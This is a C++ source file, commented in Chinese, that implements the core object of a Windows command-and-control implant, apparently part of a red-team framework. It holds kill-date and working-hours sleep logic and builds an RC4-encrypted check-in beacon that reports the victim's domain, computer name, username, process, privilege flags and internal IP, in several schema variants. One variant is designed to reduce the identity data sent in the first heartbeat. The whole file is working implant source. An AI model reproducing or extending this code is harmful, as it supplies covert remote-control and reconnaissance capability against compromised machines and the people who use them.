// 文件作用：Windows agent 主对象实现：保存 agent 状态，生成 check-in 心跳数据，并计算 sleep 时间。
#include "Agent.h"
#include "ApiLoader.h"
#include "utils.h"
#include "Packer.h"
#include "Crypt.h"

#ifndef DIRECT_HTTPS_HEARTBEAT_ONLY
#define DIRECT_HTTPS_HEARTBEAT_ONLY 0
#endif

#ifndef DIRECT_HTTPS_BEAT_DIALECT
#define DIRECT_HTTPS_BEAT_DIALECT 0
#endif

#define SELF_C2_BEAT_V4_MAGIC 0x4c504834 /* "LPH4" */
#define SELF_C2_BEAT_V4_SCHEMA 4
#define SELF_C2_BEAT_V5_MAGIC 0x4c504835 /* "LPH5" */
#define SELF_C2_BEAT_V5_SCHEMA 5
#define DIRECT_HTTPS_CAP_TASK_ENVELOPE_V2 0x00000001
#define DIRECT_HTTPS_CAP_RESULT_ENVELOPE_V2 0x00000002
#define DIRECT_HTTPS_CAP_SECTION_ENVELOPE_V3 0x00000004
#define SELF_C2_CAP_NATIVE_FRAME_V4 0x00000008
#define SELF_C2_CAPABILITIES (DIRECT_HTTPS_CAP_TASK_ENVELOPE_V2 | DIRECT_HTTPS_CAP_RESULT_ENVELOPE_V2 | DIRECT_HTTPS_CAP_SECTION_ENVELOPE_V3 | SELF_C2_CAP_NATIVE_FRAME_V4)

// Agent::operator new 使用 agent 自己的内存分配封装创建 Agent 对象。
void* Agent::operator new(size_t sz)
{
	void* p = MemAllocLocal(sz);
	return p;
}

// Agent::operator delete 释放 Agent 对象占用的本地内存。
void Agent::operator delete(void* p) noexcept
{
	MemFreeLocal(&p, sizeof(Agent));
}

// Agent 构造函数创建配置、主机信息、下载器、任务管理器、内存缓存和命令处理器。
Agent::Agent()
{
	info        = new AgentInfo();
	config      = new AgentConfig();
#if !DIRECT_HTTPS_HEARTBEAT_ONLY
	commander   = new Commander(this);
#endif
#if !DIRECT_HTTPS_CHECKIN_ONLY
	downloader  = new Downloader(config->download_chunk_size);
	jober       = new JobsController();
	memorysaver = new MemorySaver();
#endif

	SessionKey = (PBYTE) MemAllocLocal(16);
	for (int i = 0; i < 16; i++)
		SessionKey[i] = GenerateRandom32() % 0x100;
}

// IsActive 判断 agent 是否还应该继续主循环运行。
BOOL Agent::IsActive()
{
#if DIRECT_HTTPS_SKIP_UNUSED_API_INIT
	// “未用 API 不初始化”实验模式：
	// 当前测试 profile 不使用 kill_date，所以这里不再读取系统时间。
	// 这样 ApiLoad() 也不需要解析 GetSystemTimeAsFileTime。
	return this->Active;
#else
	ULONG now = GetSystemTimeAsUnixTimestamp();
	return this->Active && !(this->config->kill_date && now >= this->config->kill_date);
#endif
}

// GetWorkingSleep 根据 working time 判断本轮应该正常 sleep 还是短暂等待。
ULONG Agent::GetWorkingSleep()
{
#if DIRECT_HTTPS_SKIP_UNUSED_API_INIT
	// 当前测试 profile 不使用 working_time，所以固定返回 0。
	// 这样 ApiLoad() 不需要解析 GetLocalTime，也避免进入本地时间计算分支。
	return 0;
#else
    if ( !this->config->working_time )
        return 0;

    WORD endM   = (this->config->working_time >> 0) % 64;
    WORD endH   = (this->config->working_time >> 8) % 64;
    WORD startM = (this->config->working_time >> 16) % 64;
    WORD startH = (this->config->working_time >> 24) % 64;

	ULONG newSleepTime = 0;
	SYSTEMTIME SystemTime = { 0 };
    ApiWin->GetLocalTime(&SystemTime);

    if (SystemTime.wHour < startH) {
        newSleepTime = (startH - SystemTime.wHour) * 60 + (startM - SystemTime.wMinute);
    }
    else if (endH < SystemTime.wHour) {
        newSleepTime = (24 - SystemTime.wHour - 1) * 60 + (60 - SystemTime.wMinute);
        newSleepTime += startH * 60 + startM;
    }
    else if (SystemTime.wHour == startH && SystemTime.wMinute < startM) {
        newSleepTime = startM - SystemTime.wMinute;
    }
    else if (SystemTime.wHour == endH && endM <= SystemTime.wMinute) {
        newSleepTime = 23 * 60 + (60 + startM - SystemTime.wMinute);
    }
    else {
        return 0;
    }

    return newSleepTime * 60 - SystemTime.wSecond;
#endif
}

// BuildBeatFlags 生成心跳中的主机状态位图。
BYTE Agent::BuildBeatFlags()
{
	BYTE flag = 0;
	flag += this->info->is_server;
	flag <<= 1;
	flag += this->info->elevated;
	flag <<= 1;
	flag += this->info->sys64;
	flag <<= 1;
	flag += this->info->arch64;

	return flag;
}

// PackBeatOuterHeader 写入 BeaconHTTP listener wrapper 需要先消费的兼容字段。
VOID Agent::PackBeatOuterHeader(Packer* packer)
{
	// 前 8 字节保持兼容：BeaconHTTP listener 会先解密并剥离 agent_type/agent_id。
	packer->Pack32(this->config->agent_type);
	packer->Pack32(this->info->agent_id);
}

// PackBeatCoreFields 写入 legacy/v2 共用的固定主机字段。
VOID Agent::PackBeatCoreFields(Packer* packer, BYTE flag)
{
	packer->Pack32(this->config->sleep_delay);
	packer->Pack32(this->config->jitter_delay);
	packer->Pack32(this->config->kill_date);
	packer->Pack32(this->config->working_time);
	packer->Pack16(this->info->acp);
	packer->Pack16(this->info->oemcp);
	packer->Pack8(this->info->gmt_offest);
	packer->Pack16(this->info->pid);
	packer->Pack16(this->info->tid);
	packer->Pack32(this->info->build_number);
	packer->Pack8(this->info->major_version);
	packer->Pack8(this->info->minor_version);
	packer->Pack32(this->info->internal_ip);
	packer->Pack8(flag);
	packer->PackBytes(this->SessionKey, 16);
}

// PackBeatLegacy 写入原始学习版兼容字段顺序：domain -> computer -> username -> process。
VOID Agent::PackBeatLegacy(Packer* packer, BYTE flag)
{
	this->PackBeatCoreFields(packer, flag);
	packer->PackStringA(this->info->domain_name);
	packer->PackStringA(this->info->computer_name);
	packer->PackStringA(this->info->username);
	packer->PackStringA(this->info->process_name);
}

// PackBeatV2 写入自研 schema4 dialect：LPH4/schema/caps + process -> username -> computer -> domain。
VOID Agent::PackBeatV2(Packer* packer, BYTE flag)
{
	packer->Pack32(SELF_C2_BEAT_V4_MAGIC);
	packer->Pack32(SELF_C2_BEAT_V4_SCHEMA);
	packer->Pack32(SELF_C2_CAPABILITIES);
	this->PackBeatCoreFields(packer, flag);
	packer->PackStringA(this->info->process_name);
	packer->PackStringA(this->info->username);
	packer->PackStringA(this->info->computer_name);
	packer->PackStringA(this->info->domain_name);
}

// PackBeatV5 保留能力协商和 process 名，但省略用户、主机、域三个身份数组。
// 这样 schema5 仍可使用 schema4 的任务/结果帧，同时把首次心跳的身份面压到最小。
VOID Agent::PackBeatV5(Packer* packer, BYTE flag)
{
	packer->Pack32(SELF_C2_BEAT_V5_MAGIC);
	packer->Pack32(SELF_C2_BEAT_V5_SCHEMA);
	packer->Pack32(SELF_C2_CAPABILITIES);
	this->PackBeatCoreFields(packer, flag);
	packer->PackStringA(this->info->process_name);
}

// ReleaseBeatIdentityFields 释放 AgentInfo 中只在首次 check-in 后不再需要的字符串字段。
VOID Agent::ReleaseBeatIdentityFields()
{
	MemFreeLocal((LPVOID*)&this->info->domain_name,   StrLenA(this->info->domain_name));
	MemFreeLocal((LPVOID*)&this->info->computer_name, StrLenA(this->info->computer_name));
	MemFreeLocal((LPVOID*)&this->info->username,      StrLenA(this->info->username));
	MemFreeLocal((LPVOID*)&this->info->process_name,  StrLenA(this->info->process_name));
}

// BuildBeat 生成 agent 上线/check-in 心跳包，里面包含主机信息和 session key。
BYTE* Agent::BuildBeat(ULONG* size)
{
	BYTE flag = this->BuildBeatFlags();
	Packer* packer = new Packer();

	this->PackBeatOuterHeader(packer);

	// 后续字段由 direct_https extender 解析；dialect 2 使用 schema5 最小身份布局。
#if DIRECT_HTTPS_BEAT_DIALECT == 2
	this->PackBeatV5(packer, flag);
#elif DIRECT_HTTPS_BEAT_DIALECT == 1
	this->PackBeatV2(packer, flag);
#else
	this->PackBeatLegacy(packer, flag);
#endif
	EncryptRC4(packer->data(), packer->datasize(), this->config->encrypt_key, 16);

	this->ReleaseBeatIdentityFields();

	ULONG beat_size = packer->datasize();
	PBYTE beat      = packer->data();

	delete packer;

	*size = beat_size;
	return beat;
}
